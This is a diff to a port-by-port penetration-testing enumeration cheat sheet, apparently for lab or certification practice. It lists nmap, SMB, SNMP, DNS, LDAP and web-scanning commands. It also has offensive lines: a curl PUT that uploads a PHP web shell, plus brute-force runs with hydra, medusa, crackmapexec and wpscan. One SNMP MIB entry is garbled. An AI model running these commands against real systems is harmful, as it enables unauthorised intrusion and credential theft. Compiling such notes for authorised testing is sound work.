@@ -20,13 +20,7 @@
     
         nmap -sV -sC -F -T4  -Pn -p80,443,3306 10.10.10.x
         nmap -sS -p- -Pn ip -vv 
-
-    
-### nmap commands
-    nmap -p 22 -n -v -sV  -sC -Pn --script ssh-auth-methods --script-args ssh.user=root 192.168.1.10
-    nmap -p 22 -n -v -sV -Pn --script ssh-hostkey 192.168.1.10 
-    nmap -p 22 -n -v -sV -Pn --script ssh-brute --script-args userdb=user_list.txt,passdb=password_list.txt 192.168.1.10
-    nmap -p- --min-rate=10000 --max-rate=11000 -v -oN open_nmap -n --open 10.10.11.166
+        nmap -p- --min-rate=10000 --max-rate=11000 -v -oN open_nmap -n --open 10.10.11.166
     
    #### Nmap advanced clevest scan
    
@@ -35,11 +29,13 @@
      
      #filtering only open ports
      cat nullbyte.txt | awk '/Up$/{print $2}' | cat >> targetIP.txt
+
      # Scanning all ip addresses 
      nikto -h targetIP.txt
      nmap -il targetIP.txt
    
 ### Metasploit Modules for SSH service
+
     auxiliary/scanner/ssh/fortinet_backdoor
     auxiliary/scanner/ssh/juniper_backdoor
     auxiliary/scanner/ssh/ssh_enumusers
@@ -50,8 +46,25 @@
     
 ## port 21  (ftp)
 ### nmap commands
+    nmap -p 21 --script ftp* <ip>  
     nmap --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-anon,ftp-libopie,,ftp-vuln-cve2010-4221,tftp-enum -p 21 -n -v -sV -Pn 192.168.1.10
     
+    #Attempt Anon login:
+    User: Anonymous
+    Pass: Anonymous
+
+## port 22 (ssh)
+### Nmape commands
+```bash
+    nmap -p 22 -n -v -sV  -sC -Pn --script ssh-auth-methods --script-args ssh.user=root 192.168.1.10
+    nmap -p 22 -n -v -sV -Pn --script ssh-hostkey 192.168.1.10 
+    nmap -p 22 -n -v -sV -Pn --script ssh-brute --script-args userdb=user_list.txt,passdb=password_list.txt 192.168.1.10
+    nmap -p 22 --script ssh* -oA ssh_scan <ip>
+    ssh-vulnkey <ip> key.pub
+    ssh-keyscan <ip>
+```
+
+
 ### Metasploit Modules for FTP service;
     auxiliary/scanner/ftp/anonymous
     auxiliary/scanner/ftp/ftp_login
@@ -80,7 +93,8 @@
 ## port 25 (SMTP)
 ### nmap command
     nmap --script=smtp-enum-users,smtp-commands,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764,smtp-vuln-cve2010-4344 -p 25 -n -v -sV -Pn 192.168.1.10
- 
+    nmap --open --script smtp-enum-users -sS -p 25 -sV $IP/24
+
 ### Metasploit Modules for SMTP service;
     auxiliary/scanner/smtp/smtp_enum
     auxiliary/scanner/smtp/smtp_ntlm_domain
@@ -91,33 +105,65 @@
 
 
 ###  DNS ZONE Transfer 
-    
-     dig +nocmd  trick.htb axfr +noall +answer @trick.htb
-     dig axfr @10.10.11.166  trick.htb
-     
-1. `+nocmd` – Removes the +cmd options output.<br>
- 2. `+noall` – Removes extra headers, flags, time information, message size, etc.<br>
- 3. `+answer` – Tells dig to return the answer section (the “juicy” part of the output).
 
+```bash   
+dig +nocmd  trick.htb axfr +noall +answer @trick.htb
+dig axfr @10.10.11.166  trick.htb
+     
+- `+nocmd` – Removes the +cmd options output.<br>
+- `+noall` – Removes extra headers, flags, time information, message size, etc.<br>
+- `+answer` – Tells dig to return the answer section (the “juicy” part of the output).
+
+# Other tools
+dnsrecon -d <server> -t axfr
+host -1 test.com @ns1.test.com
+nslookup -> set type=any
+         -> ls -d test.com
+dnsrecon -d TARGET -d /usr/share/wordlists/dnsmap.txt -t std
+```
+
+## Port 389 (LDAP)
+
+```bash
+ldapsearch -h <ip> -p <port> -x -s base
+               -x: simple Authentication
+               -s: scope (base, one, sub)
+ldapsearch -LLL -x -H ldap://<FQDN> -b '' -s base '(objectclass=*)'
+```
+
+#####################################################################################
 # Web services  
 #####################################################################################
 
 ## port 80 (HTTP)
-### Enumeratng port 80
-  
-    nikto -h http://192.168.1.10/
-    nikto -host http://SERVER_IP/ -C all -output Apache.html -Format HTML 
-    curl -v -X PUT -d '<?php shell_exec($_GET["cmd"]); ?>' http://192.168.1.10/shell.php
-    sqlmap -u http://192.168.1.10/ --crawl=5 --dbms=mysql
-    cewl http://192.168.1.10/ -m 6 -w special_wordlist.txt
-    medusa -h 192.168.1.10 -u admin -P  wordlist.txt -M http -m DIR:/admin -T 10
-    wfuzz -u http://10.13.37.11:5000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
-    nmap -p 80 -n -v -sV -Pn --script http-backup-finder,http-config-backup,http-errors,http-headers,http-iis-webdav-vuln,http-internal-ip-disclosure,http-methods,http-php-version,http-qnap-nas-info,http-robots.txt,http-shellshock,http-slowloris-check,http-waf-detect,http-vuln* 192.168.1.10
-    gobuster dir -u http://<address>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -s '200,204,301,302,307,403,500' -e -x txt,php,html
-    nmap -p 80 --script=http-backup-finder --script-args http-backup-finder.url=/web-serveur/ch11/index.php challenge01.root-me.org
 
+### Enumeratng port 80
+```bash 
+nikto -h http://192.168.1.10/
+nikto -host http://SERVER_IP/ -C all -output Apache.html -Format HTML 
+curl -v -X PUT -d '<?php shell_exec($_GET["cmd"]); ?>' http://192.168.1.10/shell.php
+dirb http://192.168.56.1 -r -o dirb.txt
+sqlmap -u http://192.168.1.10/ --crawl=5 --dbms=mysql
+cewl http://192.168.1.10/ -m 6 -w special_wordlist.txt
+medusa -h 192.168.1.10 -u admin -P  wordlist.txt -M http -m DIR:/admin -T 10
+wfuzz -u http://10.13.37.11:5000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
+nmap -p 80 -n -v -sV -Pn --script http-backup-finder,http-config-backup,http-errors,http-headers,http-iis-webdav-vuln,http-internal-ip-disclosure,http-methods,http-php-version,http-qnap-nas-info,http-robots.txt,http-shellshock,http-slowloris-check,http-waf-detect,http-vuln* 192.168.1.10
+gobuster dir -u http://<address>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -s '200,204,301,302,307,403,500' -e -x txt,php,html
+nmap -p 80 --script=http-backup-finder --script-args http-backup-finder.url=/web-serveur/ch11/index.php challenge01.root-me.org
+
+
+# Site running wordpress
+`WPSscan`
+[Update] wpscan --update
+[Enum Plugins] wpscan --url <http://> --enumerate p
+[Enum Themes] wpscan --url <http://> --enumerate t
+[Enum Users] wpscan --url <http://> --enumerate u
+[BF on Enum Users] wpscan --url <http://> --wordlist <pass.txt> --threads 50
+[BF on Admin] wpscan --url <http://> --wordlist <pass.txt> --username admin --threads 50
+```
     
    ### subdomain enumeration
+
     gobuster vhost -u http://forge.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -r
     
    or
@@ -139,7 +185,7 @@ OR
 In addition to the HTTP Enumeration commands, you can use the following SSL Scan command for HTTPs Service Enumeration;
    
     sslscan https://192.168.1.10/
-    
+    nmap -sV --script ssl-enum-ciphers -p 443 <ip>
    ## Using curl command
    * source https://infinitelogins.com/2020/07/10/enumerating-http-port-80/
    
@@ -171,18 +217,26 @@ Enumeration commands for Microsoft RPC service;
 ## Port 139/445  (SAMBA (NetBios/TCP))
 Enumeration commands for Microsoft SMB service;
 
-     nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.205.140
-     nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.205.140
-     nmap -n -v -sV -Pn -p 445 --script=smb-ls,smb-mbenum,smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smbv2-enabled,smbv2-enabled,smb-vuln*        192.168.1.10
-    enum4linux -a 192.168.1.10
-    rpcclient -U "" 192.168.1.10
-     >srvinfo
-     >enumdomusers
-     >getdompwinfo
-    smbclient -L 192.168.1.10
-    smbclient \\192.168.1.10\ipc$ -U administrator
-    smbclient //192.168.1.10/ipc$ -U administrator
-    smbclient //192.168.1.10/admin$ -U administrator
+```bash
+nmap -v -p 139, 445 -oA SMB_Scan 10.11.1.0/24
+nmap -p 139, 445 --script smb* -oA smb_scan <ip>
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.205.140
+nmap -n -v -sV -Pn -p 445 --script=smb-ls,smb-mbenum,smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smbv2-enabled,smbv2-enabled,smb-vuln*        192.168.1.10
+enum4linux -a 192.168.1.10
+nmblookup -A <ip>
+nbtscan <ip>
+nbtscan -r 192.168.1.1/24
+rpcclient -U "" 192.168.1.10
+    >srvinfo
+    >enumdomusers
+    >getdompwinfo
+
+smbclient -L 192.168.1.10
+smbclient \\\\192.168.1.10\\ipc$ -U administrator
+smbclient //192.168.1.10/ipc$ -U administrator
+smbclient //192.168.1.10/admin$ -U administrator
+crackmapexec smb -u users.txt -p passes.txt --local-auth 10.10.10.178 --continue-on-success
+```
     
  ### Accessing the SAMBA Services
  
@@ -211,38 +265,57 @@ Enumeration commands for Microsoft SMB service;
 
 ## Port 161/162 - UDP (SNMP)
 
-Enumeration commands for SNMP service;
+- Enumeration commands for SNMP service;
 
-    nmap -n -vv -sV -sU -Pn -p 161,162 --script=snmp-processes,snmp-netstat 192.168.1.10
-    perl /usr/share/doc/libnet-snmp-perl/examples/snmpwalk.pl -v 1 -c public 10.13.37.11
-    snmp-check -c public -v 2c 10.13.37.11 -d 
-    onesixtyone -c communities.txt 192.168.1.10
-    snmp-check -t 192.168.1.10 -c public
-    snmpwalk -c public -v 1 192.168.1.10 [MIB_TREE_VALUE]
-    snmpenum 10.10.11.136 public linux.txt 
-    hydra -P passwords.txt -v 192.168.1.10 snmp
+```bash
+nmap -sU --open -p 161 192.168.1.0/24 -oG SNMP_hosts.txt
+nmap -p 161 --script snmp-enum <ip>
+nmap -n -vv -sV -sU -Pn -p 161,162 --script=snmp-processes,snmp-netstat 192.168.1.10
+perl /usr/share/doc/libnet-snmp-perl/examples/snmpwalk.pl -v 1 -c public 10.13.37.11
+snmp-check -c public -v 2c 10.13.37.11 -d 
+onesixtyone -c communities.txt -i 192.168.1.10 # Find community string 
+snmp-check -t 192.168.1.10 -c public # -c <cummunity string>
+snmpwalk -c public -v 1 192.168.1.10 [MIB_TREE_VALUE]
+snmpenum 10.10.11.136 public linux.txt 
+hydra -P passwords.txt -v 192.168.1.10 snmp
 
-    #Communities.txt
-    public
-    private
-    community
+#Communities.txt
+public
+private
+community
 
-    #SNMP MIB Trees
-    1.3.6.1.2.1.25.1.6.0 System Processes
-    1.3.6.1.2.1.25.4.2.1.2 Running Programs
-    1.3.6.1.2.1.25.4.2.1.4 Processes Path
-    1.3.6.1.2.1.25.2.3.1.4 Storage Units
-    1.3.6.1.2.1.25.6.3.1.2 Software Name
-    1.3.6.1.4.1.77.1.2.25 ote configuration of the HP Jetdirect device when there are no other configuration methods or it can be used to check the current configurationUser Accounts
-    1.3.6.1.2.1.6.13.1.3 TCP Local Ports
-    
-    
+#SNMP MIB Trees
+1.3.6.1.2.1.25.1.6.0 System Processes
+1.3.6.1.2.1.25.4.2.1.2 Running Programs
+1.3.6.1.2.1.25.4.2.1.4 Processes Path
+1.3.6.1.2.1.25.2.3.1.4 Storage Units
+1.3.6.1.2.1.25.6.3.1.2 Software Name
+1.3.6.1.4.1.77.1.2.25 ote configuration of the HP Jetdirect device when there are no other configuration methods or it can be used to check the current configurationUser Accounts
+1.3.6.1.2.1.6.13.1.3 TCP Local Ports
+```    
+
+## Port 111 (NFS)
+
+`apt-get install nfs-common`
+
+```bash
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.205.140
+showmount -e <ip>
+mkdir /tmp/nfs
+mount -t nfs <ip>:<share> /tmp/nfs
+```
+
 ## Port 3306 (MYSQL)
-Enumeration commands for `MySQL` service;
+- Enumeration commands for `MySQL` service;
 
-       nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 192.168.1.10
-        mysql --host=192.168.1.10 -u root -p
-        
+```bash
+nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 192.168.1.10
+mysql --host=192.168.1.10 -u root -p
+mysql -u admin -padmin -c "show databases;set database mysql;select* from users;"  
+
+# Remote access
+mysql -u admin -padmin -h <ip>
+```
         
  ## Port 3389  (RDP)
  
@@ -298,44 +371,3 @@ Enumeration commands for Remote Desktop service;
         server.quit()
 
         print("[***]successfully sent email to %s:" % (msg['To']))  
-
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
-            
